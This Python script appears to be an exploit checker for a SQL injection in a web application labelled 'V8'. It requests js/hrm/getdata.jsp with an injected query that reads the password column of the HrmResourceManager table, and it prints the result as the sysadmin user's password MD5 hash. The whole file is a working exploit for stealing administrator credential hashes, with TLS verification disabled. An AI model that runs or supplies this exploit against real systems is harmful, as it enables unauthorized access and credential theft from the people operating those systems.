import sys
import requests
import urllib3
import time

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    success_msg = now_time() + '[SUCCESS]存在V8前台SQL注入'
    warning_msg = now_time() + '[WARNING]不存在V8前台SQL注入'
    error_msg = now_time() + '[V8前台SQL注入][ERROR]目标请求失败'
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        shell_msg = now_time() + '用户: sysadmin 密码MD5: {}'.format(res.text.strip())
        if res.status_code == 200 and 'html' not in res.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except Exception as e:
        return error_msg



